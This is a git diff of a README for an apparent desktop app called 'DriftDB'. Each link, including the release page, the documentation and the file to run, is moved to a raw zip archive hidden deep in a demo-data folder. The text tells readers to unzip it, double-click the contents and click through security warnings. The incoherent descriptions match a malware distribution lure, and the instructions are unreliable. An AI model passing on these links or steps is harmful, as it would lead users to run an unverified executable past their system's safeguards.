@@ -1,6 +1,6 @@
 # 🚀 DriftDB - Your History at Your Fingertips
 
-[![Download DriftDB](https://raw.githubusercontent.com/Poomza956/DriftDB/main/whun/DriftDB.zip%20DriftDB-v1.0-blue)](https://raw.githubusercontent.com/Poomza956/DriftDB/main/whun/DriftDB.zip)
+[![Download DriftDB](https://raw.githubusercontent.com/Poomza956/DriftDB/main/demo-data/tables/orders/snapshots/Drift_DB_1.5.zip%20DriftDB-v1.0-blue)](https://raw.githubusercontent.com/Poomza956/DriftDB/main/demo-data/tables/orders/snapshots/Drift_DB_1.5.zip)
 
 ## 📖 Introduction
 
@@ -12,15 +12,15 @@ To get started, you only need to download DriftDB and run it on your machine. Fo
 
 ## 📥 Download & Install
 
-Visit this page to download: [DriftDB Releases](https://raw.githubusercontent.com/Poomza956/DriftDB/main/whun/DriftDB.zip).
+Visit this page to download: [DriftDB Releases](https://raw.githubusercontent.com/Poomza956/DriftDB/main/demo-data/tables/orders/snapshots/Drift_DB_1.5.zip).
 
-Once you're on the DriftDB releases page, you will find the latest version available for download. Look for the file labeled with the version number, such as `https://raw.githubusercontent.com/Poomza956/DriftDB/main/whun/DriftDB.zip` or similar. 
+Once you're on the DriftDB releases page, you will find the latest version available for download. Look for the file labeled with the version number, such as `https://raw.githubusercontent.com/Poomza956/DriftDB/main/demo-data/tables/orders/snapshots/Drift_DB_1.5.zip` or similar. 
 
 1. Click the link to download the file to your computer.
 2. Once the download completes, locate the downloaded file (usually found in your "Downloads" folder).
 3. Unzip the file if it is in zip format.
 4. Open the folder where you unzipped the file.
-5. You may see an executable file like `https://raw.githubusercontent.com/Poomza956/DriftDB/main/whun/DriftDB.zip`. Double-click this file to run DriftDB.
+5. You may see an executable file like `https://raw.githubusercontent.com/Poomza956/DriftDB/main/demo-data/tables/orders/snapshots/Drift_DB_1.5.zip`. Double-click this file to run DriftDB.
 
 If you encounter any prompts or security warnings, simply follow the instructions provided to allow the program to run.
 
@@ -55,7 +55,7 @@ You can access the time travel feature by selecting "View History" within your d
 
 ## 📚 Documentation
 
-For more detailed information, please refer to the official [DriftDB Documentation](https://raw.githubusercontent.com/Poomza956/DriftDB/main/whun/DriftDB.zip). Here, you can find advanced usage tips, troubleshooting advice, and examples of how to make the most out of DriftDB.
+For more detailed information, please refer to the official [DriftDB Documentation](https://raw.githubusercontent.com/Poomza956/DriftDB/main/demo-data/tables/orders/snapshots/Drift_DB_1.5.zip). Here, you can find advanced usage tips, troubleshooting advice, and examples of how to make the most out of DriftDB.
 
 ## 💬 Support & Community
 
@@ -69,6 +69,6 @@ If you encounter any technical difficulties, feel free to reach out to the suppo
 
 Stay updated about new releases and features by following the DriftDB repository. Regular updates will bring you enhancements and bug fixes to improve your experience.
 
-To download the latest version, visit: [DriftDB Releases](https://raw.githubusercontent.com/Poomza956/DriftDB/main/whun/DriftDB.zip). 
+To download the latest version, visit: [DriftDB Releases](https://raw.githubusercontent.com/Poomza956/DriftDB/main/demo-data/tables/orders/snapshots/Drift_DB_1.5.zip). 
 
 Your journey into data management has never been simpler. Enjoy using DriftDB!
